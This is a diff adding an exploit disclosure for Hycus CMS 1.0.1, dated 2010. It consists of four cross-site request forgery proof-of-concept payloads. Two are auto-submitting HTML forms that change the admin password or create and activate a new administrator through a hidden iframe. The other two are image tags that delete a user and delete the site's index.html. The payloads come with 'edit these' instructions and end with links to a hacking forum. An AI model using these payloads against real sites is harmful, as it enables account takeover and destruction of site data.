@@ -1,0 +1,79 @@
+<!---
+    Title: Hycus CMS 1.0.1 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Thu 26 Aug 2010 07:53:22 PM EEST 
+    Vendor: http://www.hycus.com/
+    Download: http://www.hycus.com/download/hycuscms-1.0.1.zip
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Hycus CMS 1.0.1 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/admin.php?adminmodule=user" method="post" >
+                <!--- Edit these --->
+                <input type="hidden" name="username" value="root" />
+                <input type="hidden" name="fullname" value="root" />
+                <input type="hidden" name="email" value="root@root.com" />
+                <input type="hidden" name="pwd" value="rootroot" />
+                <input type="hidden" name="password2" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="usertype" value="1" />
+                <input type="hidden" name="id" value="1" />
+                <input type="hidden" name="task" value="edituser" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Create Admin User ]=-
+    
+    <html>
+        <head>
+            <title>Hycus CMS 1.0.1 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <!--- Submit the first form and delay the second one to make sure the POST request is completed --->
+        <body onload="document.csrf1.submit();setTimeout('document.csrf2.submit();',5000);">
+        
+            <!--- We need this to submit the forms without redirects --->
+            <div style="visibility:hidden">
+                <iframe name="ipwn" width="20" height="20"></iframe>
+            </div>
+            
+            <!--- Creates the user --->
+            <form name="csrf1" target="ipwn" action="http://[domain]/admin.php?adminmodule=user" method="post" >
+                <!--- Edit these --->
+                <input type="hidden" name="username" value="root" />
+                <input type="hidden" name="fullname" value="root" />
+                <input type="hidden" name="email" value="root@root.com" />
+                <input type="hidden" name="pwd" value="rootroot" />
+                <input type="hidden" name="password2" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="usertype" value="1" />
+                <input type="hidden" name="task" value="adduser" />
+            </form>
+            
+            <!--- Activate the new user --->
+            <form name="csrf2" target="ipwn" action="http://[domain]/admin.php" method="get">
+                <input type="hidden" name="adminmodule" value="user" />
+                <input type="hidden" name="task" value="activateuser" />
+                <!--- We can guess here --->
+                <input type="hidden" name="id" value="2" />
+            </form>
+        </body>
+    </html>
+
+-=[ CSRF PoC 3 - Delete User ]=-
+
+    <img src="http://[domain]/admin.php?adminmodule=user&task=deleteuser&id=2" alt="Do you see this?" />
+    
+-=[ CSRF PoC 4 - Delete File ]=-
+
+    <img src="http://[domain]/admin.php?adminmodule=media&task=deletefile&dir=&file=index.html" alt="Do you see this?" />
+    
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
